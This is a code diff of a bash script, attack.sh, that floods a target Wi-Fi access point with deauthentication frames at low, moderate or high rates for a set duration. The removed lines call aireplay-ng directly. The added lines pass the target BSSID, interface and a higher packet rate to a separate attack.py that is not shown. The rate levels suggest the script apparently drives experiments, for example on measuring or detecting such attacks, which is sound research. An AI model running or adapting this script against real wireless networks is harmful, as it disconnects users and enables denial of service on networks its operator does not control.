@@ -1,10 +1,6 @@
 #!/usr/bin/env bash
-# Attacker deauth at a controlled rate for a duration.
-# usage: attack.sh <low|moderate|high> <duration_sec> <bssid> <iface>
+# usage: attack.sh <low|moderate|high> <duration> <bssid> <iface>
 set -euo pipefail
-RATE="$1"; DUR="$2"; BSSID="$3"; IFACE="$4"
-case "$RATE" in
-  low) PPS=1 ;; moderate) PPS=10 ;; high) PPS=100 ;;
-  *) echo "bad rate: $RATE"; exit 1 ;;
-esac
-sudo timeout "$DUR" aireplay-ng --deauth 0 -x "$PPS" -a "$BSSID" --ignore-negative-one "$IFACE" >/dev/null 2>&1 || true
+HERE="$(cd "$(dirname "$0")" && pwd)"
+case "$1" in low) PPS=5;; moderate) PPS=50;; high) PPS=200;; *) echo "bad rate"; exit 1;; esac
+sudo python3 "$HERE/attack.py" "$4" "$3" "$PPS" "$2"
